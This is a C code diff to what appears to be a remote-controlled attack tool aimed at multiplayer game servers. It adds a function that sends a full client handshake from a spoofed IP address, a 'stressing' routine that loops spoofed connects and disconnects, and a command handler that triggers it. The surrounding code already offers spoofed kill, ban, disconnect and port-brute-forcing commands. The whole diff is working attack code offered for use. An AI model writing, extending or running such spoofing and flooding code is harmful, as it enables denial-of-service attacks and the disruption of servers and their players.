@@ -415,6 +415,42 @@ void RconBan(const char *SrvIP, int Port, const char *BanIP)
 	m_SendRcon = true;
 }
 
+void SendConnect(const char *SrvIP, int Port, const char *SpoofIP)
+{
+	if (!Create(&m_Sock[0]))
+		Close(0);
+
+	m_FromIP[0] = inet_addr(SpoofIP);
+	m_FromPort = htons(1337);
+
+	m_ToIP = inet_addr(SrvIP);
+	m_ToPort = htons(Port);
+
+	unsigned char buffer[2048];
+	int BufferSize = 0;
+	Reset(0);
+
+	ZeroMemory(buffer, sizeof(buffer));
+	BufferSize = PackConnect(&buffer[0], 0);
+	SendData((const char*)buffer, BufferSize, 0);
+
+	ZeroMemory(buffer, sizeof(buffer));
+	BufferSize = PackClientInfo(&buffer[0], 0);
+	SendData((const char*)buffer, BufferSize, 0);
+
+	ZeroMemory(buffer, sizeof(buffer));
+	BufferSize = PackReady(&buffer[0], 0);
+	SendData((const char*)buffer, BufferSize, 0);
+
+	ZeroMemory(buffer, sizeof(buffer));
+	BufferSize = PackSendInfo(&buffer[0], 0);
+	SendData((const char*)buffer, BufferSize, 0);
+
+	ZeroMemory(buffer, sizeof(buffer));
+	BufferSize = PackEnterGame(&buffer[0], 0);
+	SendData((const char*)buffer, BufferSize, 0);
+}
+
 void SendDisconnect(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort)
 {
 	if (!Create(&m_Sock[0]))
@@ -433,6 +469,17 @@ void SendDisconnect(const char *SrvIP, int Port, const char *SpoofIP, int SpoofP
 	ZeroMemory(buffer, sizeof(buffer));
 	BufferSize = PackDisconnect(&buffer[0], 0);
 	SendData((const char*)buffer, BufferSize, 0);
+}
+
+void SendStressingNetwork(const char *SrvIP, int Port, const char *SpoofIP)
+{
+	for(int i = 0; i < 5; i++)
+	{
+		SendConnect(SrvIP, Port, SpoofIP);
+		Sleep(1);
+		SendDisconnect(SrvIP, Port, SpoofIP, 1337);
+		Sleep(1);
+	}
 }
 
 void SendKill(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort)
@@ -844,6 +891,19 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 				}
 				else
 					send(g_Client, "[Server]: Please use: kill <srvip> <srvport> <spoofip> <spoofport>", strlen("[Server]: Please use: kill <srvip> <srvport> <spoofip> <spoofport>"), 0);
+			}
+			else if(strcmp(aCmd[0], "stressing") == 0)
+			{
+				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0])
+				{
+					int SrvPort = atoi(aCmd[2]);
+
+					SendStressingNetwork(aCmd[1], SrvPort, aCmd[3]);
+
+					send(g_Client, "[Server]: Stressing network sent successfully!", strlen("[Server]: Stressing network sent successfully!"), 0);
+				}
+				else
+					send(g_Client, "[Server]: Please use: stressing <srvip> <srvport> <spoofip>", strlen("[Server]: Please use: stressing <srvip> <srvport> <spoofip>"), 0);
 			}
 			else if(strcmp(aCmd[0], "bruteport") == 0)
 			{
